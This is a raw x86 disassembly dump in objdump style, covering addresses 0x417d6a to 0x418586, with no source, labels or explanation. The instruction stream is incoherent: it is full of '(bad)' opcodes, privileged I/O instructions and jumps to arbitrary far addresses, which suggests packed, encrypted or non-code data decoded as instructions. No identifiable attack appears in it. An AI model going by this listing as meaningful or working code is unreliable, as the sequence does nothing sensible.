  417d6a:	imul   esp,esi,0xffffffb8
  417d6d:	cmp    eax,0x6add6b5a
  417d72:	dec    eax
  417d73:	and    al,0x47
  417d75:	pusha  
  417d76:	inc    eax
  417d77:	add    al,0x4f
  417d79:	or     DWORD PTR [eax],edi
  417d7b:	cmp    DWORD PTR [esi-0x752c3184],0x158fa740
  417d85:	(bad)  
  417d86:	test   eax,0x8bc83c7
  417d8b:	mov    esp,0x7ae53df
  417d90:	fist   DWORD PTR ds:0xbcea18b8
  417d96:	mov    dl,BYTE PTR [esi-0x26]
  417d99:	push   ss
  417d9a:	xor    DWORD PTR ds:0x287fdf7f,ebx
  417da0:	mov    BYTE PTR [ecx],ah
  417da2:	and    esp,edx
  417da4:	hlt    
  417da5:	and    DWORD PTR [edi-0xb],ebx
  417da8:	ror    DWORD PTR [ecx+0x38052875],0x57
  417daf:	mov    ds:0x75c99e34,eax
  417db4:	or     cl,BYTE PTR [edi+0x73a3758e]
  417dba:	popf   
  417dbb:	mov    ds:0x6f9776ec,eax
  417dc0:	adc    BYTE PTR [ebx],dl
  417dc2:	fbld   TBYTE PTR [ebx-0x40]
  417dc5:	or     BYTE PTR [ecx+ecx*4],dl
  417dc8:	xchg   BYTE PTR ds:0x81a46163,cl
  417dce:	jnp    0x417e01
  417dd0:	and    eax,0x11a832e5
  417dd5:	das    
  417dd6:	dec    esp
  417dd7:	loopne 0x417d9e
  417dd9:	(bad)  
  417dda:	stos   DWORD PTR es:[edi],eax
  417ddb:	mov    ebx,0x2385f0b4
  417de0:	lds    edi,FWORD PTR [esi-0x98f2589]
  417de6:	pop    es
  417de7:	jmp    0xfa9:0xf5f98623
  417dee:	outs   dx,DWORD PTR ds:[esi]
  417def:	rcr    DWORD PTR [eax],0xf1
  417df2:	pop    ecx
  417df3:	cld    
  417df4:	mov    bl,0xb
  417df6:	or     eax,0x384e17cb
  417dfb:	shl    BYTE PTR [esi+eax*1],1
  417dfe:	xchg   ebx,eax
  417dff:	outs   dx,BYTE PTR ds:[esi]
  417e00:	mov    ds:0x5eda14b1,al
  417e05:	xor    DWORD PTR [ebx-0x27cb2d26],ebx
  417e0b:	dec    esi
  417e0c:	in     al,0x94
  417e0e:	stc    
  417e0f:	push   ebx
  417e10:	je     0x417dcb
  417e12:	sub    BYTE PTR [edi+0x5d733075],ch
  417e18:	ret    0x3472
  417e1b:	or     al,0x5b
  417e1d:	adc    DWORD PTR [ecx-0x3af128d1],eax
  417e23:	stc    
  417e24:	outs   dx,DWORD PTR ds:[esi]
  417e25:	mov    dh,0x1b
  417e27:	pop    es
  417e28:	sub    DWORD PTR [ebx],edi
  417e2a:	clc    
  417e2b:	xchg   esi,eax
  417e2c:	pushf  
  417e2d:	(bad)  
  417e2e:	mov    esi,0xf5eacf20
  417e33:	mov    ?,WORD PTR [ecx]
  417e35:	in     eax,0xca
  417e37:	push   edx
  417e38:	cmp    dh,ah
  417e3a:	iret   
  417e3b:	fidivr DWORD PTR [edi+ebx*2-0x50cd9484]
  417e42:	pop    esp
  417e43:	cmp    edi,ebp
  417e45:	fwait
  417e46:	in     al,dx
  417e47:	shr    DWORD PTR [esp+ebp*4-0x117f5a23],0x1e
  417e4f:	cmp    ch,BYTE PTR [ecx+0x7b]
  417e52:	fdivr  st,st(4)
  417e54:	mov    gs,WORD PTR [ecx-0x38cda2c3]
  417e5a:	loopne 0x417e84
  417e5c:	jmp    0x62fb8518
  417e61:	fst    DWORD PTR [edx-0x19]
  417e64:	nop
  417e65:	dec    eax
  417e66:	and    eax,0x1970f389
  417e6b:	repz inc edi
  417e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e6e:	es fucomp st(2)
  417e71:	mov    eax,DWORD PTR [edx+0x2]
  417e74:	cmp    ah,BYTE PTR [esi]
  417e76:	arpl   WORD PTR ds:0x2ea155c,cx
  417e7c:	popf   
  417e7d:	je     0x417e2e
  417e7f:	mov    ds:0x12b3d420,al
  417e84:	dec    ebx
  417e85:	rol    dl,cl
  417e87:	pop    esp
  417e88:	jle    0x417ee4
  417e8a:	cmp    eax,0x5fb98999
  417e8f:	enter  0x58e5,0xfb
  417e93:	jne    0x417ec4
  417e95:	iret   
  417e96:	cli    
  417e97:	outs   dx,BYTE PTR ds:[esi]
  417e98:	(bad)  
  417e99:	repnz push ecx
  417e9b:	pop    esi
  417e9c:	lds    esi,FWORD PTR [eax-0x64]
  417e9f:	xchg   bh,dl
  417ea1:	push   cs
  417ea2:	ficom  DWORD PTR [edi+0x2fd6a3ba]
  417ea8:	xchg   ebp,eax
  417ea9:	sbb    DWORD PTR [ebx+ebp*8+0x24f8bfd],ecx
  417eb0:	sbb    DWORD PTR [ecx-0x2e],esi
  417eb3:	in     eax,dx
  417eb4:	les    ebx,FWORD PTR [ebx]
  417eb6:	sub    DWORD PTR [esi],0xa5164673
  417ebc:	cdq    
  417ebd:	(bad)  
  417ebf:	stos   DWORD PTR es:[edi],eax
  417ec0:	xchg   ebp,eax
  417ec1:	xchg   esi,eax
  417ec2:	push   ecx
  417ec3:	dec    edi
  417ec4:	xor    esp,DWORD PTR [ebx-0x38574ee4]
  417eca:	sti    
  417ecb:	mov    edx,0xc0648e3c
  417ed0:	and    BYTE PTR [edx+eiz*1+0x2bee10c8],bl
  417ed7:	(bad)  
  417ed8:	out    dx,eax
  417ed9:	pop    ss
  417eda:	imul   esi,edx,0x581d118e
  417ee0:	mov    ds:0x9f329685,eax
  417ee5:	shr    BYTE PTR [ebx+0x34],cl
  417ee8:	jl     0x417f1b
  417eea:	push   esi
  417eeb:	sti    
  417eec:	lock (bad) 
  417eee:	ins    BYTE PTR es:[edi],dx
  417eef:	pop    esp
  417ef0:	fwait
  417ef1:	sbb    al,0xef
  417ef3:	xor    DWORD PTR [ecx-0x3fd8876a],ebx
  417ef9:	aam    0xca
  417efb:	jmp    0x417f57
  417efd:	mov    ch,dl
  417eff:	ja     0x417f77
  417f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f02:	push   ds
  417f03:	clc    
  417f04:	pop    ecx
  417f05:	cmc    
  417f06:	inc    ebp
  417f07:	push   ebx
  417f08:	sub    BYTE PTR [edi+ecx*4-0x66f0f580],dl
  417f0f:	js     0x417f70
  417f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f12:	xchg   ebp,eax
  417f13:	in     al,dx
  417f14:	sahf   
  417f15:	jmp    0x3dde6f4f
  417f1a:	lock mov esp,0x271991b3
  417f20:	xchg   ebx,eax
  417f21:	jecxz  0x417f55
  417f23:	pop    ebx
  417f24:	cdq    
  417f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f26:	repnz push 0xca9c2
  417f2c:	mov    eax,ds:0xacd400f9
  417f31:	cwde   
  417f32:	dec    edx
  417f33:	mov    al,0x4d
  417f35:	pop    ds
  417f36:	mov    al,0xed
  417f38:	outs   dx,BYTE PTR ds:[esi]
  417f39:	xchg   esp,eax
  417f3a:	jae    0x417f2c
  417f3c:	mov    bl,0x19
  417f3e:	dec    edx
  417f3f:	push   ds
  417f40:	mov    dh,0x83
  417f42:	cmp    ecx,DWORD PTR [ebx-0x26e63051]
  417f48:	add    edx,DWORD PTR [ebp+0x3200700c]
  417f4e:	jge    0x417fcb
  417f50:	add    BYTE PTR [ecx+0x664493ed],0x5b
  417f57:	outs   dx,BYTE PTR ds:[esi]
  417f58:	lods   eax,DWORD PTR ds:[esi]
  417f59:	inc    esp
  417f5a:	not    BYTE PTR [ebp-0x2ce9c9f6]
  417f60:	cmp    DWORD PTR [ebx-0x61b1f8bf],edx
  417f66:	or     DWORD PTR [eax],ebx
  417f68:	ret    
  417f69:	inc    ebx
  417f6a:	stc    
  417f6b:	xchg   BYTE PTR [eax+0x66],dl
  417f6e:	xor    ch,BYTE PTR [esi]
  417f70:	push   0x3b94b0db
  417f75:	mov    esp,0x8f5f4560
  417f7a:	loop   0x417f5d
  417f7c:	pop    esi
  417f7d:	idiv   DWORD PTR [ebx]
  417f7f:	ins    BYTE PTR es:[edi],dx
  417f80:	cmp    eax,0xe074e9a7
  417f85:	cs sysenter 
  417f88:	and    ebx,ebp
  417f8a:	add    DWORD PTR [ebp+0x4c],ebp
  417f8d:	pop    ebx
  417f8e:	mov    DWORD PTR [edi-0x3],esp
  417f91:	mov    bl,0xb2
  417f93:	mov    eax,ds:0xee16d76
  417f98:	pop    es
  417f99:	jnp    0x417f2c
  417f9b:	cmp    DWORD PTR [ecx+0x53],0x1f
  417f9f:	out    dx,al
  417fa0:	cmp    eax,0xe92082aa
  417fa5:	inc    ebp
  417fa6:	popa   
  417fa7:	inc    eax
  417fa8:	jmp    0x417fae
  417faa:	and    al,0x8
  417fac:	inc    ebp
  417fad:	mov    ds:0xcd5e069e,eax
  417fb2:	test   al,0x2d
  417fb4:	push   ecx
  417fb5:	xor    BYTE PTR [ebx+0x4fc87229],ah
  417fbb:	push   cs
  417fbc:	jns    0x417f4b
  417fbe:	aaa    
  417fbf:	inc    edi
  417fc0:	out    dx,al
  417fc1:	mov    cl,BYTE PTR es:[ecx+0xd]
  417fc5:	sbb    eax,DWORD PTR [edx+ebx*4-0x60]
  417fc9:	pop    ds
  417fca:	scas   eax,DWORD PTR es:[edi]
  417fcb:	pusha  
  417fcc:	and    BYTE PTR [edx],bl
  417fce:	in     al,0x81
  417fd0:	inc    ebp
  417fd1:	add    ch,0xb1
  417fd4:	pop    ds
  417fd5:	push   0x2da9b29a
  417fda:	loopne 0x418044
  417fdc:	fdivr  DWORD PTR [esi-0x1175bd76]
  417fe2:	pop    ecx
  417fe3:	add    al,0xfa
  417fe5:	mov    ?,WORD PTR [esi+0x3bf83976]
  417feb:	fiadd  DWORD PTR [ebx+eiz*8]
  417fee:	je     0x418011
  417ff0:	retf   
  417ff1:	mov    BYTE PTR [ecx+0x2b],ch
  417ff4:	mov    ebx,0xf6e26ab3
  417ff9:	arpl   ax,di
  417ffb:	mov    ebx,0x8fba1e14
  418000:	push   edx
  418001:	mov    edx,0x5a492aec
  418006:	mov    ch,bh
  418008:	inc    ebx
  418009:	mov    edi,0xa4f0f46f
  41800e:	push   ecx
  41800f:	mov    DWORD PTR [edi-0x35],edx
  418012:	cld    
  418013:	mov    ds:0x976e7f7f,al
  418018:	xor    BYTE PTR [ebx+0x22],0x1d
  41801c:	xchg   edx,eax
  41801d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41801e:	pop    es
  41801f:	das    
  418020:	and    al,0x85
  418022:	icebp  
  418023:	inc    ebp
  418024:	inc    ecx
  418025:	stos   DWORD PTR es:[edi],eax
  418026:	gs inc edi
  418028:	lock dec esp
  41802a:	jb     0x41803a
  41802c:	test   al,0x8d
  41802e:	in     eax,dx
  41802f:	adc    bh,cl
  418031:	dec    esp
  418032:	add    cl,BYTE PTR [ebp+0x457a70c3]
  418038:	aas    
  418039:	(bad)  
  41803a:	pushf  
  41803b:	pop    DWORD PTR [ebp-0x7d]
  41803e:	cdq    
  41803f:	mov    esp,0xc688a121
  418044:	xor    DWORD PTR ds:0x21f2ac9,esi
  41804a:	push   ebp
  41804b:	iret   
  41804c:	pop    ecx
  41804d:	xchg   edx,ebp
  41804f:	xchg   esp,eax
  418050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418051:	fisttp WORD PTR [ebx+edx*4+0x9a6d4c6]
  418058:	xchg   BYTE PTR [ebp+0x6a],cl
  41805b:	call   0x91ae:0xfaccb6ae
  418062:	add    eax,0xd5f07801
  418067:	and    eax,0x298990ab
  41806c:	fistp  QWORD PTR [ecx]
  41806e:	and    eax,0x5e013d5e
  418073:	push   eax
  418074:	in     al,0x84
  418076:	push   ecx
  418077:	loope  0x418040
  418079:	es pop edi
  41807b:	mov    ecx,0x3981bba1
  418080:	adc    BYTE PTR [ecx+0x49],dh
  418083:	aaa    
  418084:	mov    edi,0xe67d798b
  418089:	cmp    BYTE PTR [edi],bl
  41808b:	sub    DWORD PTR [ecx-0x3a8a5a56],eax
  418091:	and    esp,DWORD PTR [edi+0x3cd17393]
  418097:	mov    ebx,0xb0636dd
  41809c:	fidiv  DWORD PTR [esi-0x1d8ae5f8]
  4180a2:	cwde   
  4180a3:	fnsave [ebp+0x36]
  4180a6:	adc    eax,0x85e4ceae
  4180ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180ac:	je     0x4180ad
  4180ae:	or     ebp,DWORD PTR [eax]
  4180b0:	inc    edx
  4180b1:	pushf  
  4180b2:	stos   BYTE PTR es:[edi],al
  4180b3:	or     BYTE PTR [ebp-0xd],cl
  4180b6:	lock sbb BYTE PTR [eax+0x17],0x45
  4180bb:	inc    ecx
  4180bc:	cmp    DWORD PTR [ebp+0x680f8a24],0xffffff94
  4180c3:	push   cs
  4180c4:	jmp    DWORD PTR [eax]
  4180c6:	mov    cl,0xaf
  4180c8:	xchg   ebx,eax
  4180c9:	sub    eax,0xd5df7eea
  4180ce:	test   DWORD PTR [ebx+0x45ca8ec5],0x3f939959
  4180d8:	aam    0x32
  4180da:	cmp    eax,0x8fbed199
  4180df:	bound  esi,QWORD PTR [edx]
  4180e1:	push   esi
  4180e2:	push   ebx
  4180e3:	(bad)  
  4180e4:	mov    BYTE PTR [edx-0xaf5e325],cl
  4180ea:	push   0x151bf2f0
  4180ef:	bound  ecx,QWORD PTR [edi+0x171bdaf5]
  4180f5:	add    DWORD PTR [eax],esp
  4180f7:	and    ebp,eax
  4180f9:	jnp    0x4180f9
  4180fb:	sbb    cl,ah
  4180fd:	and    eax,0x9f5c309d
  418102:	daa    
  418103:	repz fstp st(7)
  418106:	and    al,0xb8
  418108:	or     eax,ebx
  41810a:	sbb    bl,0x93
  41810d:	mov    edx,0xab5a8718
  418112:	sbb    esi,ecx
  418114:	fst    DWORD PTR [edx]
  418116:	xchg   ebp,eax
  418117:	dec    ebp
  418118:	out    dx,eax
  418119:	out    0x69,eax
  41811b:	mov    esi,0xbd014dc4
  418120:	inc    ebx
  418121:	call   0xf685d45
  418126:	lds    eax,FWORD PTR [ecx-0x14f8e6fd]
  41812c:	push   0x609ee24d
  418131:	push   0x186d3ab7
  418136:	das    
  418137:	mov    cl,0xa7
  418139:	sub    DWORD PTR [eax-0x211c72b5],ebx
  41813f:	jae    0x41810b
  418141:	loope  0x41811f
  418143:	xor    dl,BYTE PTR [ebx+edx*2+0x39]
  418147:	sbb    esi,eax
  418149:	push   edx
  41814a:	call   0x1051:0x7956c356
  418151:	add    eax,0xac11a330
  418156:	test   DWORD PTR [ecx-0x1e],ecx
  418159:	aam    0xb8
  41815b:	sub    BYTE PTR [ebx],ch
  41815d:	(bad)
  418161:	js     0x418136
  418163:	adc    esp,DWORD PTR [esi-0x2]
  418166:	arpl   WORD PTR [edi-0x548bdf49],dx
  41816c:	inc    edx
  41816d:	retf   0xcfeb
  418170:	mov    ecx,0x5e13082a
  418175:	mov    ds:0x4258e257,al
  41817a:	jns    0x4181d5
  41817c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41817d:	mov    eax,0x66f147ca
  418182:	fwait
  418183:	jns    0x4181b6
  418185:	mov    ?,WORD PTR [ecx]
  418187:	iret   
  418188:	sub    edx,DWORD PTR ds:0x3e9d2b46
  41818e:	cmp    bl,BYTE PTR ds:0x1fab792e
  418194:	test   al,0x99
  418196:	test   eax,0x491ceb6a
  41819b:	(bad)  [edx]
  41819d:	adc    edx,eax
  41819f:	sbb    bl,0xbf
  4181a2:	call   0xce858f5f
  4181a7:	adc    eax,0x38eadaf5
  4181ac:	pop    ss
  4181ad:	push   0x38
  4181af:	jno    0x41820a
  4181b1:	push   ds
  4181b2:	into   
  4181b3:	call   0xf445:0x5f71cee5
  4181ba:	mov    bh,BYTE PTR [eax-0x1b]
  4181bd:	fisubr WORD PTR [ebx+0x13f508aa]
  4181c3:	xor    dh,BYTE PTR ds:0xf456fa7b
  4181c9:	jge    0x418153
  4181cb:	or     DWORD PTR [eax],ebp
  4181cd:	mov    ecx,0x788ca689
  4181d2:	xlat   BYTE PTR ds:[ebx]
  4181d3:	cmp    ah,BYTE PTR [eax]
  4181d5:	mov    ds:0xc8b9394e,eax
  4181da:	mov    eax,0x24ae95aa
  4181df:	push   ds
  4181e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181e1:	or     bh,BYTE PTR [esi+0x5b]
  4181e4:	mov    ebx,0xc54e152
  4181e9:	fdivr  QWORD PTR [esi-0x40]
  4181ec:	popa   
  4181ed:	stos   BYTE PTR es:[edi],al
  4181ee:	lods   al,BYTE PTR ds:[esi]
  4181ef:	jecxz  0x4181f1
  4181f1:	or     al,0x35
  4181f3:	or     dl,BYTE PTR [edx+0x387b652]
  4181f9:	or     BYTE PTR [esi+0x7f9a8cd1],0x4d
  418200:	das    
  418201:	adc    BYTE PTR [ecx+0x46],dh
  418204:	das    
  418205:	pop    edi
  418206:	or     al,0x71
  418208:	fs retf 0x81fe
  41820c:	sar    DWORD PTR [ecx+0x2c],0x92
  418210:	push   ebp
  418211:	pop    ebp
  418212:	push   ebp
  418213:	jecxz  0x418238
  418215:	sub    DWORD PTR [ecx],ecx
  418217:	pop    es
  418218:	fcomp  DWORD PTR [edi+0x31]
  41821b:	cmp    BYTE PTR [ebx],ch
  41821d:	push   eax
  41821e:	or     al,0xd6
  418220:	cmc    
  418221:	jo     0x4181a7
  418223:	mov    ebp,DWORD PTR [edi]
  418225:	xor    eax,0xf234a69f
  41822a:	retf   
  41822b:	inc    eax
  41822c:	loop   0x418259
  41822e:	mov    BYTE PTR [edx-0x67],ah
  418231:	jnp    0x41828d
  418233:	ret    
  418234:	lods   al,BYTE PTR ds:[esi]
  418235:	inc    esp
  418236:	jae    0x418270
  418238:	imul   ebx,DWORD PTR [ecx+eax*8],0x6cd0920a
  41823f:	in     eax,dx
  418240:	jl     0x4182af
  418242:	xchg   esi,eax
  418243:	popa   
  418244:	stos   BYTE PTR es:[edi],al
  418245:	xchg   ebx,eax
  418246:	lock mov esi,0x36d2500b
  41824c:	bound  esp,QWORD PTR [edi-0x3531e33c]
  418252:	int3   
  418253:	adc    ebx,DWORD PTR [esi+0x18]
  418256:	or     ebx,DWORD PTR [edi-0x25b1eed1]
  41825c:	add    BYTE PTR ds:0x8f7e1eb5,0x0
  418263:	pop    edi
  418264:	sahf   
  418265:	dec    edi
  418266:	rcr    DWORD PTR [esi],cl
  418268:	dec    esi
  418269:	rcr    BYTE PTR [ecx+ebp*2-0x1d],cl
  41826d:	or     BYTE PTR [edi],0x4
  418270:	or     cl,BYTE PTR [edx+0x30]
  418273:	mov    al,cs:0x51a15c29
  418279:	add    cl,BYTE PTR [eax+0x5de80232]
  41827f:	lds    ecx,FWORD PTR [edx-0x54]
  418282:	mov    bl,cl
  418284:	or     esi,DWORD PTR [ebx-0x6c]
  418287:	shl    DWORD PTR [eax+0x202008f9],0x17
  41828e:	jmp    0xbc635a5d
  418293:	(bad)  
  418294:	neg    DWORD PTR [ebx-0x3b]
  418297:	mov    esi,esi
  418299:	pop    es
  41829a:	idiv   BYTE PTR [edx+0x6f]
  41829d:	nop
  41829e:	mov    bh,0x8c
  4182a0:	xchg   edi,eax
  4182a1:	hlt    
  4182a2:	pop    ss
  4182a3:	pop    es
  4182a4:	sti    
  4182a5:	inc    edx
  4182a6:	lods   eax,DWORD PTR ds:[esi]
  4182a7:	repz jbe 0x418232
  4182aa:	pop    ecx
  4182ab:	dec    ebp
  4182ac:	cmp    DWORD PTR [ebp+0x3eb85ea8],esi
  4182b2:	(bad)  
  4182b4:	icebp  
  4182b5:	and    eax,0x9a393930
  4182ba:	pop    edx
  4182bb:	js     0x41825a
  4182bd:	add    ecx,DWORD PTR [esi+0x70]
  4182c0:	scas   eax,DWORD PTR es:[edi]
  4182c1:	inc    ecx
  4182c2:	aas    
  4182c3:	loop   0x4182b7
  4182c5:	jns    0x418293
  4182c7:	lea    esi,[ebx]
  4182c9:	sti    
  4182ca:	imul   ecx,DWORD PTR [eax-0x678a8115],0x6eac196f
  4182d4:	(bad)  
  4182d5:	ds scas eax,DWORD PTR es:[edi]
  4182d7:	adc    al,BYTE PTR [ebx+edi*2-0x7e]
  4182db:	pop    esp
  4182dc:	push   esi
  4182dd:	dec    edx
  4182de:	inc    eax
  4182df:	test   BYTE PTR [ebp-0x302d15c4],cl
  4182e5:	xchg   ebx,eax
  4182e6:	scas   eax,DWORD PTR es:[edi]
  4182e7:	push   ecx
  4182e8:	outs   dx,DWORD PTR ds:[esi]
  4182e9:	and    eax,0x56c75cc4
  4182ee:	clc    
  4182ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182f0:	jp     0x4182ec
  4182f2:	or     BYTE PTR [esi+0x53],al
  4182f5:	(bad)  
  4182f6:	loopne 0x418292
  4182f8:	mov    WORD PTR [eax+ebx*4+0x66c9bc5e],es
  4182ff:	push   cs
  418300:	push   ds
  418301:	jo     0x4182bc
  418303:	dec    esi
  418304:	push   edi
  418305:	popa   
  418306:	je     0x41834a
  418308:	mov    edx,esi
  41830a:	mov    edx,DWORD PTR [edi]
  41830c:	in     eax,0xb1
  41830e:	es inc ebx
  418310:	pop    eax
  418311:	mov    dl,0xc3
  418313:	or     BYTE PTR [eax],dl
  418315:	add    BYTE PTR [esi],bh
  418317:	das    
  418318:	cmp    esi,DWORD PTR [edi+0x5d]
  41831b:	mov    ecx,0xa88dcba2
  418320:	mov    cl,0xbf
  418322:	das    
  418323:	jne    0x41831d
  418325:	sub    eax,0xe12f0986
  41832a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832b:	in     eax,dx
  41832c:	and    al,0xc3
  41832e:	out    0xe1,al
  418330:	outs   dx,BYTE PTR ds:[esi]
  418331:	jg     0x418350
  418333:	or     esi,eax
  418335:	and    al,0x55
  418337:	ret    
  418338:	dec    ebx
  418339:	mov    eax,0xb0c00454
  41833e:	jecxz  0x4182c3
  418340:	mov    dh,0x4f
  418342:	xchg   DWORD PTR [edi+eax*1],edi
  418345:	mov    edi,0x9749876b
  41834a:	or     bh,BYTE PTR [edi]
  41834c:	fs and al,0xa0
  41834f:	call   0x82aa:0x80d19a18
  418356:	lahf   
  418357:	xchg   esi,eax
  418358:	shl    DWORD PTR [edx+esi*1+0x63],cl
  41835c:	popf   
  41835d:	cdq    
  41835e:	nop
  41835f:	outs   dx,BYTE PTR ds:[esi]
  418360:	mov    BYTE PTR [ecx+0x638c8596],ch
  418366:	fcomp  DWORD PTR [ebx+0x65]
  418369:	push   ebx
  41836a:	sub    eax,0xa2638d42
  41836f:	pop    esi
  418370:	or     esp,DWORD PTR [ebp-0x5e5cc96a]
  418376:	loope  0x41830e
  418378:	mov    edx,0xc4bd4101
  41837d:	mov    ebp,0xa324e559
  418382:	and    BYTE PTR [edx],0x23
  418385:	gs call 0x3bbf1c2d
  41838b:	jmp    0xbd6fb867
  418390:	lds    ebx,FWORD PTR [ebx+0x4a53defa]
  418396:	sbb    al,0xa2
  418398:	outs   dx,BYTE PTR ds:[esi]
  418399:	int3   
  41839a:	jne    0x418327
  41839c:	and    ch,BYTE PTR ds:0xdcba834a
  4183a2:	push   esi
  4183a3:	xchg   esp,ebx
  4183a5:	and    al,0x9a
  4183a7:	mov    DWORD PTR ds:0x4c2524b,edx
  4183ad:	(bad)  
  4183ae:	addr16 mov edx,0xc99772cd
  4183b4:	data16 adc cl,dh
  4183b7:	scas   eax,DWORD PTR es:[edi]
  4183b8:	cmp    cl,BYTE PTR [edi]
  4183ba:	mov    edx,0xd42db6bb
  4183bf:	call   0xfb6ebd42
  4183c4:	add    BYTE PTR [ebx-0x64231763],cl
  4183ca:	enter  0xf07a,0x2b
  4183ce:	in     eax,0xa0
  4183d0:	push   es
  4183d1:	and    DWORD PTR [edx],edx
  4183d3:	jmp    DWORD PTR [edi+0x6]
  4183d6:	mov    esi,0x358792d
  4183db:	std    
  4183dc:	inc    ebp
  4183dd:	mov    bl,dl
  4183df:	or     DWORD PTR [edi],0x390d51a7
  4183e5:	xor    eax,0x884326e3
  4183ea:	dec    esi
  4183eb:	pop    esp
  4183ec:	fwait
  4183ed:	jg     0x41843c
  4183ef:	dec    edi
  4183f0:	inc    edi
  4183f1:	add    eax,0x23507984
  4183f6:	aad    0x52
  4183f8:	cmp    BYTE PTR [edx-0xeb1c14c],ch
  4183fe:	fidivr WORD PTR [eax+0x579df6ed]
  418404:	and    eax,edx
  418406:	mov    eax,ds:0x56fdc792
  41840b:	fimul  DWORD PTR [ecx+0x65]
  41840e:	jp     0x418460
  418410:	dec    ebx
  418411:	stos   DWORD PTR es:[edi],eax
  418412:	dec    esp
  418413:	std    
  418414:	sar    BYTE PTR [edi+edi*8-0x7b],cl
  418418:	sbb    eax,0x4e76817a
  41841d:	pop    edi
  41841e:	inc    ebp
  41841f:	jae    0x4183c8
  418421:	lahf   
  418422:	mov    eax,ds:0x13cae783
  418427:	lea    esi,[edi-0x53847f46]
  41842d:	loopne 0x4183b1
  41842f:	inc    edx
  418430:	or     eax,0x29b9c232
  418435:	in     al,dx
  418436:	aaa    
  418437:	cli    
  418438:	push   eax
  418439:	test   al,0xdd
  41843b:	xor    BYTE PTR [ebx],cl
  41843d:	ret    
  41843e:	sub    al,0x4f
  418440:	into   
  418441:	(bad)  
  418442:	jecxz  0x41842f
  418444:	scas   eax,DWORD PTR es:[edi]
  418445:	jge    0x4183eb
  418447:	aad    0xc3
  418449:	pop    eax
  41844a:	ins    BYTE PTR es:[edi],dx
  41844b:	dec    esi
  41844c:	xor    edi,ebp
  41844e:	adc    eax,0xf267dd00
  418453:	mov    ds:0xda6ec22d,eax
  418458:	shl    DWORD PTR [esi+0x10cd81a6],cl
  41845e:	lea    esp,[ebx]
  418460:	stos   BYTE PTR es:[edi],al
  418461:	fisubr WORD PTR [edi-0x30541514]
  418467:	or     BYTE PTR [esi+0x7f],ah
  41846a:	imul   ecx,DWORD PTR [eax+0x6c],0xf2fc781
  418471:	xor    bl,BYTE PTR [eax+0x7e6fada]
  418477:	mov    edx,es
  418479:	data16 mov ds:0x88e3f77e,al
  41847f:	pop    esp
  418480:	mov    esp,0xc3223c3d
  418485:	inc    ebp
  418486:	and    DWORD PTR [ebp-0x30],edx
  418489:	inc    esi
  41848a:	pop    ss
  41848b:	dec    edx
  41848c:	mov    dh,0xc6
  41848e:	out    0x4f,al
  418490:	add    DWORD PTR [esi+edx*2-0x7a9ef7e7],esi
  418497:	adc    al,0x7e
  418499:	loopne 0x4184e1
  41849b:	jb     0x41849d
  41849d:	add    ecx,ecx
  41849f:	icebp  
  4184a0:	fadd   DWORD PTR [esi-0x4d9ad93c]
  4184a6:	fdivr  st(2),st
  4184a8:	cmp    eax,0x44d86626
  4184ad:	xor    eax,0x3448760c
  4184b2:	push   cs
  4184b3:	and    edi,0x34
  4184b6:	xchg   DWORD PTR [eax-0x2741356e],eax
  4184bc:	xchg   esp,eax
  4184bd:	sbb    BYTE PTR [edi-0x10fefd28],ch
  4184c3:	xor    ebp,esp
  4184c5:	adc    BYTE PTR [esi+esi*8],al
  4184c8:	ins    DWORD PTR es:[edi],dx
  4184c9:	fadd   QWORD PTR [edx+0x6f]
  4184cc:	enter  0xe92,0xc4
  4184d0:	mov    al,ds:0x33e2dffe
  4184d5:	push   ebp
  4184d6:	jnp    0x41850d
  4184d8:	gs cmp eax,0xc2182669
  4184de:	adc    bh,0xaf
  4184e1:	std    
  4184e2:	mov    bl,BYTE PTR ds:0x6647c391
  4184e8:	(bad)  
  4184e9:	and    ecx,DWORD PTR [edx]
  4184eb:	imul   esp,DWORD PTR [edx-0x55dec10b],0x5a6764f5
  4184f5:	cdq    
  4184f6:	imul   ecx,DWORD PTR [eax],0x404221d2
  4184fc:	inc    esi
  4184fd:	and    esp,ebp
  4184ff:	sbb    bl,ah
  418501:	mov    dh,0xdd
  418503:	(bad)
  418506:	xor    edx,DWORD PTR [edx-0x9]
  418509:	jb     0x4184b2
  41850b:	(bad)
  41850e:	int3   
  41850f:	push   esp
  418510:	xchg   DWORD PTR [esi+0x21655c32],esi
  418516:	jmp    0x82d7:0xd2a17b49
  41851d:	fdiv   DWORD PTR [ecx]
  41851f:	scas   al,BYTE PTR es:[edi]
  418520:	jne    0x41858c
  418522:	or     bh,BYTE PTR [esi+0x51526b3c]
  418528:	push   0x19639d41
  41852d:	and    al,0x12
  41852f:	fmul   st(3),st
  418531:	leave  
  418532:	pop    ecx
  418533:	mov    ?,ecx
  418535:	jmp    FWORD PTR [esi-0x20]
  418538:	fisubr WORD PTR [eax-0x5b8a77c]
  41853e:	cmp    BYTE PTR [ecx+0x2efe4cfd],ch
  418544:	scas   eax,DWORD PTR es:[edi]
  418545:	cmp    ebx,DWORD PTR fs:[ecx-0x74]
  418549:	pop    ss
  41854a:	or     eax,0xeb6aff05
  41854f:	popf   
  418550:	and    ch,BYTE PTR [ebx+esi*1+0x55]
  418554:	shl    esp,1
  418556:	adc    edx,DWORD PTR [edx+0x18]
  418559:	lahf   
  41855a:	cld    
  41855b:	fcmovne st,st(1)
  41855d:	xor    cl,ah
  41855f:	dec    esi
  418560:	mov    ds:0x5babc83c,eax
  418565:	mov    al,ds:0x4d1193d7
  41856a:	inc    esi
  41856b:	retf   
  41856c:	pop    esp
  41856d:	or     edi,DWORD PTR [edi+0x35]
  418570:	push   ecx
  418571:	pushf  
  418572:	lock add eax,DWORD PTR ds:0x2f194b6d
  418579:	dec    ebx
  41857a:	mov    dl,0x57
  41857c:	(bad)  
  41857d:	push   cs
  41857e:	adc    al,0x1c
  418580:	jmp    0x41855a
  418582:	fwait
  418583:	cli    
  418584:	aad    0xa2
  418586:	mov    bl,0xc9
